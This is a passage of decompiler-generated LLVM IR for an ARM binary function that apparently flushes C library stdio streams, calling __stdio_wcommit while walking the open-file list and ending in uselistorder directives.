  %v2_16f68124 = load i32, i32* %v1_16f68123, align 4
  store i32 %v2_16f68124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16f6c126 = icmp eq i32 %v2_16f68124, 0
  br i1 %v9_16f6c126, label %dec_label_pc_16f74, label %dec_label_pc_16f8c

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge
  %v0_16f74127 = phi i32 [ %v1_16f6c.pre, %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge ], [ 0, %dec_label_pc_16f5c ]
  store i32 %v0_16f74127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16f84 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16f84, label %dec_label_pc_16f88, label %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge

dec_label_pc_16f74.dec_label_pc_16f68_crit_edge:  ; preds = %dec_label_pc_16f74
  %v0_16f68.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16f6c.pre = load i32, i32* @r4, align 4
  %v1_16f68 = inttoptr i32 %v0_16f68.pre to i32*
  %v2_16f68 = load i32, i32* %v1_16f68, align 4
  store i32 %v2_16f68, i32* %r3.global-to-local, align 4
  %v3_16f6c = icmp uge i32 %v2_16f68, %v1_16f6c.pre
  store i1 %v3_16f6c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f6c = icmp eq i32 %v2_16f68, %v1_16f6c.pre
  br i1 %v9_16f6c, label %dec_label_pc_16f74, label %dec_label_pc_16f8c

dec_label_pc_16f88:                               ; preds = %dec_label_pc_16f74
  %v0_16f88 = load i32, i32* @r4, align 4
  store i32 %v0_16f88, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f8c

dec_label_pc_16f8c:                               ; preds = %dec_label_pc_16f5c, %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge, %dec_label_pc_16f88
  %v0_16f8c = phi i32 [ %v0_16f88, %dec_label_pc_16f88 ], [ %v2_16f68124, %dec_label_pc_16f5c ], [ %v2_16f68, %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge ]
  %v1_16f8c = phi i32 [ %v0_16f88, %dec_label_pc_16f88 ], [ 0, %dec_label_pc_16f5c ], [ %v1_16f6c.pre, %dec_label_pc_16f74.dec_label_pc_16f68_crit_edge ]
  %v3_16f8c = icmp uge i32 %v0_16f8c, %v1_16f8c
  store i1 %v3_16f8c, i1* %cpsr_c.global-to-local, align 1
  %v9_16f8c = icmp eq i32 %v0_16f8c, %v1_16f8c
  br i1 %v9_16f8c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_16f8c
  %v1_16f90 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16f90, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_16f8c, %bb67
  %v1_16f94 = xor i1 %v9_16f8c, true
  call void @__pseudo_cond_branch(i1 %v1_16f94, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_16f98 = load i32, i32* %r8.global-to-local, align 4
  %v1_16f98 = load i32, i32* %r5.global-to-local, align 4
  %v2_16f98 = add i32 %v1_16f98, 8
  %v3_16f98 = inttoptr i32 %v2_16f98 to i32*
  store i32 %v0_16f98, i32* %v3_16f98, align 4
  %v0_16fa0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f48, %bb68
  %v0_16fac = phi i32 [ %v0_16f4c, %dec_label_pc_16f48 ], [ %v0_16fa0.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16fa0 = add i32 %v0_16fac, 152
  %v3_16fa0 = inttoptr i32 %v2_16fa0 to i32*
  %v4_16fa0 = load i32, i32* %v3_16fa0, align 4
  store i32 %v4_16fa0, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16fa8 = add i32 %v4_16fa0, 4
  %v2_16fa8 = inttoptr i32 %v1_16fa8 to i32*
  %v3_16fa8 = load i32, i32* %v2_16fa8, align 4
  store i32 %v3_16fa8, i32* %r1.global-to-local, align 4
  %v2_16fac = add i32 %v0_16fac, 76
  %v3_16fac = inttoptr i32 %v2_16fac to i32*
  %v4_16fac = load i32, i32* %v3_16fac, align 4
  store i32 %v4_16fac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16fb0 = icmp eq i32 %v3_16fa8, 0
  %v1_16fb4 = inttoptr i32 %v4_16fac to i32*
  %v2_16fb4 = load i32, i32* %v1_16fb4, align 4
  store i32 %v2_16fb4, i32* @r5, align 4
  br i1 %v2_16fb0, label %dec_label_pc_16fbc, label %dec_label_pc_1701c

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16f9c
  %v2_16fbc = add i32 %v4_16fa0, 8
  %v3_16fbc = inttoptr i32 %v2_16fbc to i32*
  store i32 0, i32* %v3_16fbc, align 4
  %v0_16fc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16fc0, i32* @r7, align 4
  br label %dec_label_pc_16fc4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16ff4.dec_label_pc_16fc4_crit_edge, %dec_label_pc_16fbc
  %v0_16fc4 = phi i32 [ %v0_16fc4.pre, %dec_label_pc_16ff4.dec_label_pc_16fc4_crit_edge ], [ %v0_16fc0, %dec_label_pc_16fbc ]
  %v1_16fc4 = inttoptr i32 %v0_16fc4 to i32*
  %v2_16fc4 = load i32, i32* %v1_16fc4, align 4
  store i32 %v2_16fc4, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16fc4, i32* %r2.global-to-local, align 4
  %v2_16fd0111 = load i32, i32* %v1_16fc4, align 4
  store i32 %v2_16fd0111, i32* %r3.global-to-local, align 4
  %v3_16fd4113 = icmp uge i32 %v2_16fd0111, %v2_16fc4
  store i1 %v3_16fd4113, i1* %cpsr_c.global-to-local, align 1
  %v9_16fd4119 = icmp eq i32 %v2_16fd0111, %v2_16fc4
  br i1 %v9_16fd4119, label %dec_label_pc_16fdc, label %dec_label_pc_16ff4

dec_label_pc_16fdc:                               ; preds = %dec_label_pc_16fc4, %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge
  %v0_16fdc120 = phi i32 [ %v1_16fd4.pre, %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge ], [ %v2_16fc4, %dec_label_pc_16fc4 ]
  store i32 %v0_16fdc120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16fec = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16fec, label %dec_label_pc_16ff0, label %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge

dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge:  ; preds = %dec_label_pc_16fdc
  %v0_16fd0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16fd4.pre = load i32, i32* @r4, align 4
  %v1_16fd0 = inttoptr i32 %v0_16fd0.pre to i32*
  %v2_16fd0 = load i32, i32* %v1_16fd0, align 4
  store i32 %v2_16fd0, i32* %r3.global-to-local, align 4
  %v3_16fd4 = icmp uge i32 %v2_16fd0, %v1_16fd4.pre
  store i1 %v3_16fd4, i1* %cpsr_c.global-to-local, align 1
  %v9_16fd4 = icmp eq i32 %v2_16fd0, %v1_16fd4.pre
  br i1 %v9_16fd4, label %dec_label_pc_16fdc, label %dec_label_pc_16ff4

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16fdc
  %v0_16ff0 = load i32, i32* @r4, align 4
  store i32 %v0_16ff0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16ff4

dec_label_pc_16ff4:                               ; preds = %dec_label_pc_16fc4, %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge, %dec_label_pc_16ff0
  %v0_16ffc = phi i32 [ %v0_16ff0, %dec_label_pc_16ff0 ], [ %v2_16fd0111, %dec_label_pc_16fc4 ], [ %v2_16fd0, %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge ]
  %v1_16ff4 = phi i32 [ %v0_16ff0, %dec_label_pc_16ff0 ], [ %v2_16fc4, %dec_label_pc_16fc4 ], [ %v1_16fd4.pre, %dec_label_pc_16fdc.dec_label_pc_16fd0_crit_edge ]
  %v3_16ff4 = icmp uge i32 %v0_16ffc, %v1_16ff4
  store i1 %v3_16ff4, i1* %cpsr_c.global-to-local, align 1
  %v9_16ff4 = icmp eq i32 %v0_16ffc, %v1_16ff4
  br i1 %v9_16ff4, label %dec_label_pc_16ffc, label %dec_label_pc_16ff4.dec_label_pc_16fc4_crit_edge

dec_label_pc_16ff4.dec_label_pc_16fc4_crit_edge:  ; preds = %dec_label_pc_16ff4
  %v0_16fc4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16fc4

dec_label_pc_16ffc:                               ; preds = %dec_label_pc_16ff4
  %v2_16ffc = icmp ne i32 %v1_16ff4, 0
  store i1 %v2_16ffc, i1* %cpsr_c.global-to-local, align 1
  %v7_17000 = icmp slt i32 %v1_16ff4, 2
  br i1 %v7_17000, label %dec_label_pc_1701cthread-pre-split, label %dec_label_pc_17004

dec_label_pc_17004:                               ; preds = %dec_label_pc_16ffc
  %v0_17004 = load i32, i32* @r7, align 4
  store i32 %v0_17004, i32* %r0.global-to-local, align 4
  %v0_17008 = load i32, i32* %r1.global-to-local, align 4
  %v1_17008 = add i32 %v0_17008, 129
  store i32 %v1_17008, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1701cthread-pre-split

dec_label_pc_1701cthread-pre-split:               ; preds = %dec_label_pc_16ffc, %dec_label_pc_17004
  %v0_17168.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_1701c

dec_label_pc_1701c:                               ; preds = %dec_label_pc_1701cthread-pre-split, %dec_label_pc_16f9c
  %v0_17168.pr = phi i32 [ %v0_17168.pr.pr, %dec_label_pc_1701cthread-pre-split ], [ %v2_16fb4, %dec_label_pc_16f9c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1716818 = icmp eq i32 %v0_17168.pr, 0
  br i1 %v2_1716818, label %dec_label_pc_17170, label %dec_label_pc_1702c

dec_label_pc_1702c:                               ; preds = %dec_label_pc_1701c, %dec_label_pc_17164
  %v0_17054 = phi i32 [ %v3_17164, %dec_label_pc_17164 ], [ %v0_17168.pr, %dec_label_pc_1701c ]
  %v1_1702c = inttoptr i32 %v0_17054 to i16*
  %v2_1702c = load i16, i16* %v1_1702c, align 2
  %v3_1702c = zext i16 %v2_1702c to i32
  store i32 %v3_1702c, i32* %r3.global-to-local, align 4
  %v1_17030 = and i32 %v3_1702c, 64
  %v2_17030 = icmp eq i32 %v1_17030, 0
  br i1 %v2_17030, label %dec_label_pc_17164, label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_1702c
  %v0_17038 = load i32, i32* @r6, align 4
  %v1_17038 = load i32, i32* %sb.global-to-local, align 4
  %v2_17038 = add i32 %v1_17038, %v0_17038
  %v3_17038 = inttoptr i32 %v2_17038 to i32*
  %v4_17038 = load i32, i32* %v3_17038, align 4
  store i32 %v4_17038, i32* %r3.global-to-local, align 4
  %v1_1703c = inttoptr i32 %v4_17038 to i32*
  %v2_1703c = load i32, i32* %v1_1703c, align 4
  store i32 %v2_1703c, i32* %r3.global-to-local, align 4
  %v2_17040 = icmp ugt i32 %v2_1703c, 1
  store i1 %v2_17040, i1* %cpsr_c.global-to-local, align 1
  %v7_17040 = icmp eq i32 %v2_1703c, 2
  br i1 %v7_17040, label %dec_label_pc_170a4, label %dec_label_pc_17048

dec_label_pc_17048:                               ; preds = %dec_label_pc_17038
  %v1_17048 = add i32 %v0_17054, 64
  %v2_17048 = inttoptr i32 %v1_17048 to i32*
  %v3_17048 = load i32, i32* %v2_17048, align 4
  store i32 %v3_17048, i32* %r3.global-to-local, align 4
  %v1_1704c = load i32, i32* %r8.global-to-local, align 4
  %v3_1704c = icmp uge i32 %v3_17048, %v1_1704c
  store i1 %v3_1704c, i1* %cpsr_c.global-to-local, align 1
  %v9_1704c = icmp eq i32 %v3_17048, %v1_1704c
  br i1 %v9_1704c, label %dec_label_pc_17098, label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_17048
  %v1_17054 = add i32 %v0_17054, 56
  store i32 %v1_17054, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17054, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1706486 = inttoptr i32 %v1_17054 to i32*
  %v2_1706487 = load i32, i32* %v1_1706486, align 4
  store i32 %v2_1706487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1706894 = icmp eq i32 %v2_1706487, 0
  br i1 %v9_1706894, label %dec_label_pc_17070, label %dec_label_pc_17088

dec_label_pc_17070:                               ; preds = %dec_label_pc_17054, %dec_label_pc_17070.dec_label_pc_17064_crit_edge
  %v0_1707095 = phi i32 [ %v1_17068.pre, %dec_label_pc_17070.dec_label_pc_17064_crit_edge ], [ 0, %dec_label_pc_17054 ]
  store i32 %v0_1707095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17080 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17080, label %dec_label_pc_17084, label %dec_label_pc_17070.dec_label_pc_17064_crit_edge

dec_label_pc_17070.dec_label_pc_17064_crit_edge:  ; preds = %dec_label_pc_17070
  %v0_17064.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17068.pre = load i32, i32* @r4, align 4
  %v1_17064 = inttoptr i32 %v0_17064.pre to i32*
  %v2_17064 = load i32, i32* %v1_17064, align 4
  store i32 %v2_17064, i32* %r3.global-to-local, align 4
  %v3_17068 = icmp uge i32 %v2_17064, %v1_17068.pre
  store i1 %v3_17068, i1* %cpsr_c.global-to-local, align 1
  %v9_17068 = icmp eq i32 %v2_17064, %v1_17068.pre
  br i1 %v9_17068, label %dec_label_pc_17070, label %dec_label_pc_17088

dec_label_pc_17084:                               ; preds = %dec_label_pc_17070
  %v0_17084 = load i32, i32* @r4, align 4
  store i32 %v0_17084, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17088

dec_label_pc_17088:                               ; preds = %dec_label_pc_17054, %dec_label_pc_17070.dec_label_pc_17064_crit_edge, %dec_label_pc_17084
  %v0_17088 = phi i32 [ %v0_17084, %dec_label_pc_17084 ], [ %v2_1706487, %dec_label_pc_17054 ], [ %v2_17064, %dec_label_pc_17070.dec_label_pc_17064_crit_edge ]
  %v1_17088 = phi i32 [ %v0_17084, %dec_label_pc_17084 ], [ 0, %dec_label_pc_17054 ], [ %v1_17068.pre, %dec_label_pc_17070.dec_label_pc_17064_crit_edge ]
  %v3_17088 = icmp uge i32 %v0_17088, %v1_17088
  store i1 %v3_17088, i1* %cpsr_c.global-to-local, align 1
  %v9_17088 = icmp eq i32 %v0_17088, %v1_17088
  br i1 %v9_17088, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17088
  %v1_1708c = load i32, i32* @r7, align 4
  store i32 %v1_1708c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17088, %bb69
  %v1_17090 = xor i1 %v9_17088, true
  call void @__pseudo_cond_branch(i1 %v1_17090, i32 ptrtoint (i32* @global_var_14784.527 to i32))
  %v0_17094 = load i32, i32* %r8.global-to-local, align 4
  %v1_17094 = load i32, i32* @r5, align 4
  %v2_17094 = add i32 %v1_17094, 64
  %v3_17094 = inttoptr i32 %v2_17094 to i32*
  store i32 %v0_17094, i32* %v3_17094, align 4
  %v0_17098.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17098

dec_label_pc_17098:                               ; preds = %dec_label_pc_17048, %bb70
  %v0_17098 = phi i32 [ %v0_17054, %dec_label_pc_17048 ], [ %v0_17098.pre, %bb70 ]
  %v1_17098 = add i32 %v0_17098, 60
  %v2_17098 = inttoptr i32 %v1_17098 to i32*
  %v3_17098 = load i32, i32* %v2_17098, align 4
  %v1_1709c = add i32 %v3_17098, 1
  store i32 %v1_1709c, i32* %r3.global-to-local, align 4
  store i32 %v1_1709c, i32* %v2_17098, align 4
  %v0_170a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_170a4

dec_label_pc_170a4:                               ; preds = %dec_label_pc_17038, %dec_label_pc_17098
  %v0_170bc = phi i32 [ %v0_17054, %dec_label_pc_17038 ], [ %v0_170a4.pre, %dec_label_pc_17098 ]
  %v1_170a4 = inttoptr i32 %v0_170bc to i16*
  %v2_170a4 = load i16, i16* %v1_170a4, align 2
  %v3_170a4 = zext i16 %v2_170a4 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_170ac = or i32 %v3_170a4, %stack_var_-44.1
  %v1_170b0 = xor i32 %v2_170ac, 320
  store i32 %v1_170b0, i32* %r3.global-to-local, align 4
  %v1_170b4 = and i32 %v1_170b0, 832
  %v2_170b4 = icmp eq i32 %v1_170b4, 0
  br i1 %v2_170b4, label %dec_label_pc_170bc, label %bb71

dec_label_pc_170bc:                               ; preds = %dec_label_pc_170a4
  store i32 %v0_170bc, i32* %r0.global-to-local, align 4
  %v1_170c0 = call i32 @__stdio_wcommit(i32 %v0_170bc)
  store i32 %v1_170c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170c4 = icmp eq i32 %v1_170c0, 0
  br i1 %v2_170c4, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_170bc
  %v1_170c8 = load i32, i32* @r5, align 4
  %v2_170c8 = inttoptr i32 %v1_170c8 to i16*
  %v3_170c8 = load i16, i16* %v2_170c8, align 2
  %v4_170c8 = zext i16 %v3_170c8 to i32
  store i32 %v4_170c8, i32* %r3.global-to-local, align 4
  %v2_170cc = add i32 %v1_170c8, 8
  %v3_170cc = inttoptr i32 %v2_170cc to i32*
  %v4_170cc = load i32, i32* %v3_170cc, align 4
  store i32 %v4_170cc, i32* %r2.global-to-local, align 4
  %v2_170d0 = and i32 %v4_170c8, 65471
  store i32 %v2_170d0, i32* %r3.global-to-local, align 4
  %v3_170d4 = add i32 %v1_170c8, 28
  %v4_170d4 = inttoptr i32 %v3_170d4 to i32*
  store i32 %v4_170cc, i32* %v4_170d4, align 4
  %v1_170d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_170d8 = trunc i32 %v1_170d8 to i16
  %v3_170d8 = load i32, i32* @r5, align 4
  %v4_170d8 = inttoptr i32 %v3_170d8 to i16*
  store i16 %v2_170d8, i16* %v4_170d8, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_170bc
  %v1_170dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_170dc, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_170a4, %.thread7
  %v0_170e0 = load i32, i32* @r6, align 4
  %v1_170e0 = load i32, i32* %sb.global-to-local, align 4
  %v2_170e0 = add i32 %v1_170e0, %v0_170e0
  %v3_170e0 = inttoptr i32 %v2_170e0 to i32*
  %v4_170e0 = load i32, i32* %v3_170e0, align 4
  store i32 %v4_170e0, i32* %r3.global-to-local, align 4
  %v1_170e4 = inttoptr i32 %v4_170e0 to i32*
  %v2_170e4 = load i32, i32* %v1_170e4, align 4
  store i32 %v2_170e4, i32* %r3.global-to-local, align 4
  %v2_170e8 = icmp ugt i32 %v2_170e4, 1
  store i1 %v2_170e8, i1* %cpsr_c.global-to-local, align 1
  %v7_170e8 = icmp eq i32 %v2_170e4, 2
  br i1 %v7_170e8, label %dec_label_pc_17164, label %dec_label_pc_170f0

dec_label_pc_170f0:                               ; preds = %bb71
  %v0_170f0 = load i32, i32* @r5, align 4
  %v1_170f0 = add i32 %v0_170f0, 60
  %v2_170f0 = inttoptr i32 %v1_170f0 to i32*
  %v3_170f0 = load i32, i32* %v2_170f0, align 4
  %v1_170f4 = add i32 %v3_170f0, -1
  store i32 %v1_170f4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_170f8 = icmp eq i32 %v1_170f4, 0
  store i32 %v1_170f4, i32* %v2_170f0, align 4
  br i1 %v2_170f8, label %dec_label_pc_17104, label %dec_label_pc_17164

dec_label_pc_17104:                               ; preds = %dec_label_pc_170f0
  %v0_17104 = load i32, i32* %r3.global-to-local, align 4
  %v1_17104 = load i32, i32* @r5, align 4
  %v2_17104 = add i32 %v1_17104, 64
  %v3_17104 = inttoptr i32 %v2_17104 to i32*
  store i32 %v0_17104, i32* %v3_17104, align 4
  %v0_17108 = load i32, i32* @r5, align 4
  %v1_17108 = add i32 %v0_17108, 56
  store i32 %v1_17108, i32* @r7, align 4
  br label %dec_label_pc_1710c

dec_label_pc_1710c:                               ; preds = %dec_label_pc_1713c.dec_label_pc_1710c_crit_edge, %dec_label_pc_17104
  %v0_17114 = phi i32 [ %v0_17114.pre, %dec_label_pc_1713c.dec_label_pc_1710c_crit_edge ], [ %v1_17108, %dec_label_pc_17104 ]
  %v0_1710c = phi i32 [ %v0_1710c.pre, %dec_label_pc_1713c.dec_label_pc_1710c_crit_edge ], [ %v0_17108, %dec_label_pc_17104 ]
  %v1_1710c = add i32 %v0_1710c, 56
  %v2_1710c = inttoptr i32 %v1_1710c to i32*
  %v3_1710c = load i32, i32* %v2_1710c, align 4
  store i32 %v3_1710c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17114, i32* %r2.global-to-local, align 4
  %v1_1711897 = inttoptr i32 %v0_17114 to i32*
  %v2_1711898 = load i32, i32* %v1_1711897, align 4
  store i32 %v2_1711898, i32* %r3.global-to-local, align 4
  %v3_1711c100 = icmp uge i32 %v2_1711898, %v3_1710c
  store i1 %v3_1711c100, i1* %cpsr_c.global-to-local, align 1
  %v9_1711c106 = icmp eq i32 %v2_1711898, %v3_1710c
  br i1 %v9_1711c106, label %dec_label_pc_17124, label %dec_label_pc_1713c

dec_label_pc_17124:                               ; preds = %dec_label_pc_1710c, %dec_label_pc_17124.dec_label_pc_17118_crit_edge
  %v0_17124107 = phi i32 [ %v1_1711c.pre, %dec_label_pc_17124.dec_label_pc_17118_crit_edge ], [ %v3_1710c, %dec_label_pc_1710c ]
  store i32 %v0_17124107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17134 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17134, label %dec_label_pc_17138, label %dec_label_pc_17124.dec_label_pc_17118_crit_edge

dec_label_pc_17124.dec_label_pc_17118_crit_edge:  ; preds = %dec_label_pc_17124
  %v0_17118.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1711c.pre = load i32, i32* @r4, align 4
  %v1_17118 = inttoptr i32 %v0_17118.pre to i32*
  %v2_17118 = load i32, i32* %v1_17118, align 4
  store i32 %v2_17118, i32* %r3.global-to-local, align 4
  %v3_1711c = icmp uge i32 %v2_17118, %v1_1711c.pre
  store i1 %v3_1711c, i1* %cpsr_c.global-to-local, align 1
  %v9_1711c = icmp eq i32 %v2_17118, %v1_1711c.pre
  br i1 %v9_1711c, label %dec_label_pc_17124, label %dec_label_pc_1713c

dec_label_pc_17138:                               ; preds = %dec_label_pc_17124
  %v0_17138 = load i32, i32* @r4, align 4
  store i32 %v0_17138, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %dec_label_pc_1710c, %dec_label_pc_17124.dec_label_pc_17118_crit_edge, %dec_label_pc_17138
  %v0_17144 = phi i32 [ %v0_17138, %dec_label_pc_17138 ], [ %v2_1711898, %dec_label_pc_1710c ], [ %v2_17118, %dec_label_pc_17124.dec_label_pc_17118_crit_edge ]
  %v1_1713c = phi i32 [ %v0_17138, %dec_label_pc_17138 ], [ %v3_1710c, %dec_label_pc_1710c ], [ %v1_1711c.pre, %dec_label_pc_17124.dec_label_pc_17118_crit_edge ]
  %v3_1713c = icmp uge i32 %v0_17144, %v1_1713c
  store i1 %v3_1713c, i1* %cpsr_c.global-to-local, align 1
  %v9_1713c = icmp eq i32 %v0_17144, %v1_1713c
  br i1 %v9_1713c, label %dec_label_pc_17144, label %dec_label_pc_1713c.dec_label_pc_1710c_crit_edge

dec_label_pc_1713c.dec_label_pc_1710c_crit_edge:  ; preds = %dec_label_pc_1713c
  %v0_1710c.pre = load i32, i32* @r5, align 4
  %v0_17114.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1710c

dec_label_pc_17144:                               ; preds = %dec_label_pc_1713c
  %v2_17144 = icmp ne i32 %v1_1713c, 0
  store i1 %v2_17144, i1* %cpsr_c.global-to-local, align 1
  %v7_17148 = icmp slt i32 %v1_1713c, 2
  br i1 %v7_17148, label %dec_label_pc_17164, label %dec_label_pc_1714c

dec_label_pc_1714c:                               ; preds = %dec_label_pc_17144
  %v0_1714c = load i32, i32* @r5, align 4
  %v1_1714c = add i32 %v0_1714c, 56
  store i32 %v1_1714c, i32* %r0.global-to-local, align 4
  %v0_17150 = load i32, i32* %r1.global-to-local, align 4
  %v1_17150 = add i32 %v0_17150, 129
  store i32 %v1_17150, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17164

dec_label_pc_17164:                               ; preds = %dec_label_pc_170f0, %dec_label_pc_1714c, %dec_label_pc_17144, %bb71, %dec_label_pc_1702c
  %v0_17164 = load i32, i32* @r5, align 4
  %v1_17164 = add i32 %v0_17164, 32
  %v2_17164 = inttoptr i32 %v1_17164 to i32*
  %v3_17164 = load i32, i32* %v2_17164, align 4
  store i32 %v3_17164, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17168 = icmp eq i32 %v3_17164, 0
  br i1 %v2_17168, label %dec_label_pc_17170, label %dec_label_pc_1702c

dec_label_pc_17170:                               ; preds = %dec_label_pc_17164, %dec_label_pc_1701c
  %v0_17170 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17170, i32* %r0.global-to-local, align 4
  %v0_171ac.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17178:                               ; preds = %dec_label_pc_16e54
  %v3_17178 = load i16, i16* %arg1, align 2
  %v4_17178 = zext i16 %v3_17178 to i32
  %v1_1717c = and i32 %v4_17178, 64
  store i32 %v1_1717c, i32* %r3.global-to-local, align 4
  %v2_1717c = icmp eq i32 %v1_1717c, 0
  br i1 %v2_1717c, label %bb72, label %dec_label_pc_17188

bb72:                                             ; preds = %dec_label_pc_17178
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17188:                               ; preds = %dec_label_pc_17178
  %v2_17188 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17188, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1718c = icmp eq i32 %v2_17188, 0
  br i1 %v2_1718c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17188
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17188
  %v1_17190 = load i32, i32* @r4, align 4
  %v2_17190 = inttoptr i32 %v1_17190 to i16*
  %v3_17190 = load i16, i16* %v2_17190, align 2
  %v4_17190 = zext i16 %v3_17190 to i32
  store i32 %v4_17190, i32* %r3.global-to-local, align 4
  %v2_17194 = add i32 %v1_17190, 8
  %v3_17194 = inttoptr i32 %v2_17194 to i32*
  %v4_17194 = load i32, i32* %v3_17194, align 4
  store i32 %v4_17194, i32* %r2.global-to-local, align 4
  %v2_17198 = and i32 %v4_17190, 65471
  store i32 %v2_17198, i32* %r3.global-to-local, align 4
  %v2_1719c = trunc i32 %v2_17198 to i16
  store i16 %v2_1719c, i16* %v2_17190, align 2
  %v1_171a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_171a0 = load i32, i32* @r4, align 4
  %v3_171a0 = add i32 %v2_171a0, 28
  %v4_171a0 = inttoptr i32 %v3_171a0 to i32*
  store i32 %v1_171a0, i32* %v4_171a0, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17170, %.thread14
  %v0_171ac = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_171ac.pre, %dec_label_pc_17170 ], [ 0, %.thread14 ]
  store i32 %v0_171ac, i32* %r0.global-to-local, align 4
  store i32 %v6_16e28, i32* %r5.global-to-local, align 4
  ret i32 %v0_171ac

; uselistorder directives
  uselistorder i32 %v0_171ac, { 1, 0 }
  uselistorder i32 %v3_17164, { 1, 2, 0 }
  uselistorder i32 %v0_17138, { 1, 0, 2 }
  uselistorder i32 %v1_1711c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_170bc, { 1, 0, 2 }
  uselistorder i32 %v0_17084, { 1, 0, 2 }
